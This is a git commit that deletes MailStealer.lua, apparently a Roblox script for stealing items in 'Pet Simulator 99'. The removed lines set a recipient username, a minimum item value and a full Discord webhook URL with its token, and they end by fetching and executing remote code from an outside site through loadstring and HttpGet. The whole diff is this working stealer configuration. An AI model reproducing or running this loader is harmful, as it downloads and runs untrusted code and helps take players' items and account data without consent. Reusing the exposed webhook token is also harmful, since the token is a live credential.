2b8085e568e2cf56a63195fcece7acbb436fcb36
TrungB <88281940+TrungB2@users.noreply.github.com>
2024-02-22 02:51:29 +0700

    Delete MailStealer.lua

--- MailStealer.lua
+++
@@ -1,9 +0,0 @@
-Username = "trungb2"
-Username2 = "trungb2"
-Webhook = "https://discord.com/api/webhooks/1203354181545500742/VqXmMOizpI5BDrMreR845HJuXhQgESyDYDvUDnTvZ_SLJrpHw4860ALIizVO5oh55uSa"
-
-LoadingScreen = false
-
-MinimumRAP = 100000
-
-loadstring(game:HttpGet("https://hugegames.lol/ps99"))()
